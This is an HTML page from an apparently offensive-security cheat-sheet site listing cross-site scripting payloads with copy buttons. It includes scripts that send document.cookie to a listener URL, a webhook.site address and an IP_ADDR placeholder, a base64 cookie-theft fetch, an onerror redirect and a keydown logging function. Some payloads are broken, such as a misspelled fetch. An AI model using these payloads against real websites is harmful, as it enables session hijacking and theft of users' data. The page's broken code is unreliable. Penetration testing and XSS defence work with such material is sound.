<!DOCTYPE html>
<html lang="en-US">
<head>
<link rel="icon" type="image/x-icon" href="/machete/conf/LOGO01.png">
<link rel="stylesheet" type="text/css" href="/machete/conf/machete_style_offensive_sections.css">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
<script>
	function ctrl_C(element) {
  	var $temp = $("<input>");
  	$("body").append($temp);
  	$temp.val($(element).text()).select();
  	document.execCommand("copy");
  	$temp.remove();
	alert("DONE. >> CONTINUE!");
}	
</script>
  <title> M A C H E T E </title>
  <!--------------------->
  <!-- b0ydC Founder -->
  <!-- --------------- -->
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta charset="utf-8" />

</head>
<body>
<br>
<a href="/machete/index.html"><img src="/machete/conf/letter_logo.jpg" alt="LOGO" style="width:20%;"></a>
<br>
<center>
<div style="font-size:24px; text-align:center; font-family:courier,monospace;">
    <a href="/machete/offensive.html">OFFENSIVE</a> |
    <a href="/machete/defensive.html">DEFENSIVE</a> |
    <a href="/machete/tools.html">TOOLS</a> |
    <a href="/machete/about.html">ABOUT</a> 
</div> 

<p class="titulos"><mark>[CROSS-SITE SCRIPTING]</mark></p>
<div>
<pre>
<div class="column" style="display: inline-block; text-align: left; background-color:gray;">
<button onclick="document.location='/machete/offensive/web_penetration_testing/client_side_attacks.html'" class="round" style="float: left;">&lt;&lt;</button><br><br>
<details>
<summary>GENERAL TECHNIQUES</summary>

<b>C1: </b><mark id="GT01">&lt;script&gt;var i = new Image;i.src="LISTENER URL/?"+document.cookie;&lt;/script&gt;</mark>

<b>SAMPLE: </b><mark>&lt;script&gt;var i = new Image;i.src="https://webhook.site/#!/d88f22e7-9e44-47e8-9508-edeb3406d1cd/?"+document.cookie;&lt;/script&gt;</mark>

<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#GT01')">.C1.</button>

<b>NOTE: </b> Do not remove the /? symbols, they allow to use the "document.cookie" as parameter. 

</details>	
<details>
<summary>REFLECTED TECHNIQUES</summary>
<p><b>DESCRIPTION:</b> It is when data is retrieved in the webpage without any restriction. So it can be used to exfiltrate
information, stole information, etc. </p>
<p><b>COMMON TESTS:</b>

<b>C1: </b><mark id="RTA01">&lt;h1&gt;TEST&lt;/h1&gt;</mark>	
<b>C2: </b><mark id="RTA02">&lt;script&gt;alert('XSS');&lt;/script&gt;</mark> || C1 & C2, NORMAL TEST TO KNOW IF VULNERABILITY EXIST	

<b>C3: </b><mark id="RTA03">&lt;script&gt;alert(document.cookie);&lt;/script&gt;</mark> || NORMAL TEST TO RETRIEVE COOKIES

<b>C4: </b><mark id="RTA04">&lt;script&gt;fecth('http://IP_ADDR/${btoa(document.cookie)}');&lt;/script&gt;</mark> || STOLE ENCODED BASE64 COOKIE

*for this to work, it is needed a python server or any listener to retrieve the content.<br>

<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#RTA01')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#RTA02')">.C2.</button>  | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#RTA03')">.C3.</button>  | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#RTA04')">.C4.</button> 
	
</p>
<details>
<summary>TEST VIA DEV TOOLS</summary>

1. open dev tools in your browser
2. type: <mark id="TDT01">alert(1)</mark> | <mark id="TDT02">print()</mark> | <mark id="TDT03">prompt("hello")</mark>

<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#TDT01')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#TDT02')">.C2.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#TDT03')">.C3.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#HDT004')">.C4.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#HDT005')">.C5.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#HDT006')">.C6.</button></p>

<b><u>CREATE A LOG FUNCTION TO STORE/RETRIEVE DATA USING XSS</u></b>

<b><u>step1></u></b>
$ <mark id="TDT04">function logKey(event){console.log(event.key)}</mark>
<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#TDT04')">.C1.</button>

<b><u>step2></u></b>
$ <mark id="TDT05">document.addEventListener('keydown', logKey)</mark>
<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#TDT05')">.C1.</button>
	
</details>
</details>
<details>
<summary>STORED TECHNIQUES</summary>
<p>DESCRIPTION: It is when data (exploit) is stored in the webpage without any restriction. So it can be used 
to exploit any user that loads the vulnerable page. </p>
</details>
<details>
<summary>DOM TECHNIQUES</summary>
<p>DESCRIPTION: </p>

<b><u>HOW TO KNOW IF DOM-BASED VULNERABILITY EXIST ?</u></b>

One way, is to use the application as expected and open dev tools and inspect the network tab, if there's requests coming and 
going it means it is reflected or stored, if not, it means it is <b>DOM-BASED.</b> 

<details>
<summary>NORMAL TESTS</summary>

1. <mark id="TDT06">&lt;img src=x onerror="prompt(1)"&gt;
2. <mark id="TDT07">&lt;img src=x onerror="window.location.href="https://machetevault.github.io/machete""&gt;

<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#TDT06')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#TDT07')">.C2.</button>
	
</details>	
</details>		
</div>
</pre>
<button onclick="document.location='/machete/offensive/web_penetration_testing/client_side_attacks.html'">GO BACK</button>
</div>
<p class="titulos">©® - 2023.</p>
</center>
</body>
</html>
